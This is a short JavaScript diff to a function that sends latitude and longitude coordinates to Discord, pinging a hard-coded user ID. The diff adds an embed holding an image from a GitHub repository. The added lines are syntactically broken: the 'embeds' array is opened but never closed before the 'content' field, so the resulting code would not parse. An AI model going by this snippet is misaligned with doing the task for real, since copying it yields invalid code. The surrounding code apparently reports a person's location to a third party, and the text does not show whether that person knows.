@@ -275,6 +275,12 @@
         const JanisUID = "789782857852911616"
         function sendToDiscord(latitude, longitude) {
             const payload = {
+                embeds: [
+    {
+        image: {
+            url: "https://raw.githubusercontent.com/yhkq1/tracking-garbage/1e146e2c80794858dd8c6dd31eb50c9073e8a7a4/divider-36072_1.png"
+        }
+    }
                 content: `<@${JanisUID}>
 Latitude: ${latitude}
 Longitude: ${longitude}
